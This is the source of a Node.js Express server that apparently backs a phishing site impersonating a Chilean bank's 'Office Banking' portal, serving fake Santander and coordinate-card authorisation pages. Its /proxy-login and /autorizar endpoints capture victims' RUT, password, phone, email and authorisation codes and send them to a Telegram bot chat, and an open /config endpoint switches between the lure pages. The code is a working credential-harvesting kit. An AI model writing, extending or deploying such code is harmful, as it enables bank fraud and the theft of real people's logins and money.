const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const session = require("express-session"); // ✅ agregado

// Si tu Node es <18, instala node-fetch y descomenta:
// const fetch = require("node-fetch");

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// ✅ Configuración de sesión con expiración de 5 minutos
app.use(session({
  secret: "clave-secreta-super-segura", // cámbiala por algo único
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 5 * 60 * 1000 } // 5 minutos
}));

// ✅ Middleware para proteger rutas
function requireLogin(req, res, next) {
  if (req.session && req.session.autenticado) {
    next();
  } else {
    res.redirect("/"); // redirige al login si no hay sesión
  }
}

// Endpoint para leer configuración
app.get("/config", (req, res) => {
  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
  res.json(cfg);
});

// Endpoint para guardar configuración
app.post("/config", (req, res) => {
  fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
  res.json(req.body);
});

// Ruta directa al admin (URL corta)
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Decidir qué página de autorización mostrar (protegida)
app.get("/autorizacion", requireLogin, (req, res) => {
  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));

  if (cfg.tipoAutorizacion === "santander") {
    res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
    return;
  }

  if (cfg.tipoAutorizacion === "coordenadas") {
    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
    return;
  }

  res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
});

// Endpoint para recibir autorizaciones y reenviar a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
    });

    res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
  } catch (err) {
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Endpoint para login → enviar credenciales o correo a Telegram
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, telefono, mail } = req.body;
  let mensaje;

  if (mail) {
    mensaje = `Correo actualizado:\n${mail || "(sin correo)"}`;
  } else {
    mensaje = `Login recibido AutOB:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nTeléfono: ${telefono || "(sin teléfono)"}`;
  }

  try {
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
    });

    // ✅ Aquí marcamos la sesión como autenticada
    req.session.autenticado = true;

    res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
  } catch (err) {
    res.status(500).json({ status: "error", error: err.message });
  }
});

// ✅ Logout para cerrar sesión
app.get("/salir", (req, res) => {
  req.session.destroy(err => {
    res.redirect("/"); // vuelve al login
  });
});

// Servir index.html por defecto
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ✅ Ruta protegida para productos
app.get("/productos", requireLogin, (req, res) => {
  res.sendFile(path.join(__dirname, "public", "productos.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
